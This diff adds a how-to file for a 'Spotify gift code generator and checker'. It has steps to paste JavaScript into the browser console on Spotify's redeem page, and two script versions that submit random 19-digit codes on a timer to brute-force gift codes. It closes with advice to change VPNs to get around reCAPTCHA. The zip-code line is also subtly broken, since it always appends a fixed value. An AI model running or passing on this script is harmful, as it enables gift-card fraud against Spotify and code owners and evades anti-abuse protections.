@@ -1,0 +1,47 @@
+############## SPOTIFY GIFT CODE GEN AND CHECKER METHOD ########################
+Go to https://www.spotify.com/us/redeem/
+Sign in.	
+Press ctrl+shift+j (to open console).
+Paste the following code in and click enter.
+Follow the prompts and begin generating+checking!
+Code:
+var speed = prompt("Speed of checker/gen (Recommended 500 for fast pcs, 1000 for slow)")
+var zip = prompt("Zipcode (leave blank for default)") + "10008"
+function generateCode() {
+ var code = "";
+ var chars = "0123456789";
+ for (var i = 0; i < 19; i++)
+   code += chars.charAt(Math.floor(Math.random() * chars.length));
+ return code;
+}
+function main() {  
+   document.getElementById("redeem_code_token").value = generateCode();
+   document.getElementById("redeem_code_zip-code").value = zip;
+   document.getElementById("redeem_code_submit").click();
+}
+
+setInterval(function() {
+   main();
+}, speed);
+
+NOTE: If there is no "zip code" section, please use the code below.
+
+Code:
+var speed = prompt("Speed of checker/gen (Recommended 500 for fast pcs, 1000 for slow)")
+function generateCode() {
+ var code = "";
+ var chars = "0123456789";
+ for (var i = 0; i < 19; i++)
+   code += chars.charAt(Math.floor(Math.random() * chars.length));
+ return code;
+}
+function main() {  
+   document.getElementById("redeem_code_token").value = generateCode();
+   document.getElementById("redeem_code_submit").click();
+}
+
+setInterval(function() {
+   main();
+}, speed);
+
+If you see recaptcha try changing your vpn/etc
